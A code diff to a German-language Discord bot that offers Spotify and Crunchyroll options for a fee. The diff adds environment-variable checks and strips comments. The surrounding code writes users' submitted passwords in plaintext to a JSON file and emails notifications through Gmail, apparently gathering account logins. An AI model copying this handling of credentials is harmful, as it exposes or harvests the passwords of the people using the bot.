@@ -4,6 +4,15 @@ const fs = require('fs');
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
+// ✅ .env-Validierung
+const requiredEnv = ['TOKEN', 'CLIENT_ID', 'MAIL_USER', 'MAIL_PASS', 'NOTIFY_TO'];
+const missingEnv = requiredEnv.filter((key) => !process.env[key]);
+
+if (missingEnv.length > 0) {
+  console.error(`❌ Fehlende Umgebungsvariablen: ${missingEnv.join(', ')}`);
+  process.exit(1);
+}
+
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
   partials: [Partials.Channel]
@@ -38,7 +47,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setCustomId('consent_accept')
         .setLabel('Ich stimme zu')
         .setStyle(ButtonStyle.Success),
-
       new ButtonBuilder()
         .setCustomId('consent_decline')
         .setLabel('Ich lehne ab')
@@ -64,7 +72,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setCustomId('choose_spotify')
           .setLabel('Spotify (30 €)')
           .setStyle(ButtonStyle.Primary),
-
         new ButtonBuilder()
           .setCustomId('choose_crunchyroll')
           .setLabel('Crunchyroll (40 €)')
@@ -135,12 +142,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
       password
     };
 
-    // Speicherung in JSON (Testzwecke)
     fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
       if (err) console.error('Fehler beim Speichern:', err);
     });
 
-    // E-Mail-Benachrichtigung senden (über nodemailer)
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
